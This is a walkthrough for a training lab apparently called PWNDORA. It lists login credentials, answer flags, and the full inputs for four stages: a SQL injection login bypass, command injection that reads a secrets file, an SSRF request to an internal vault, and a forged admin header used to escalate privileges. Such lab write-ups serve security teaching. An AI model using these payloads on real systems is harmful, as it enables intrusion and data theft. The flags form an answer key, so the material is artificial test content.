# PWNDORA Lab — Walkthrough

Quick solutions for all 4 stages. Complete them in order.

Login: `test@pwndora` / `test@123`

---

## Stage 1: Authentication Bypass (SQL Injection)

Go to **Playground** → Stage 1 login form.

- **Email:** `admin@meridian.hr' OR '1'='1' --`
- **Password:** `anything`

Click login. You'll get an admin session token. Submit the flag from the response.

**Flag:** `FLAG{M3ridian_Auth_ByPass_2026}`

---

## Stage 2: Command Injection

Go to **Playground** → Stage 2 ping diagnostics.

- **Host:** `127.0.0.1; cat /var/secrets/internal_endpoints.json`

Click run. The output reveals the SSRF vault URL and access token.

**Flag:** `FLAG{C0mmand_In_T3st_9921}`

---

## Stage 3: SSRF

Go to **Playground** → Stage 3 profile importer.

- **URL:** `http://127.0.0.1:3000/api/internal/vault?token=SVC_KEY_7493201`

Click import. The response leaks the admin JWT secret.

**Flag:** `FLAG{SSRF_Vau1t_Bypas5_5512}`

---

## Stage 4: Privilege Escalation

Go to **Playground** → Stage 4 privilege escalation.

- **Header:** `x-admin-key: ADMIN_SIG_JWT_SECRET_XYZ_987`
- **Body:** `{"elevate": true, "user": "admin@meridian.hr"}`

Click run. This exfiltrates the executive payroll database.

**Flag:** `FLAG{PR1V_ESC_EXFIL_8830_SUCCESS}`
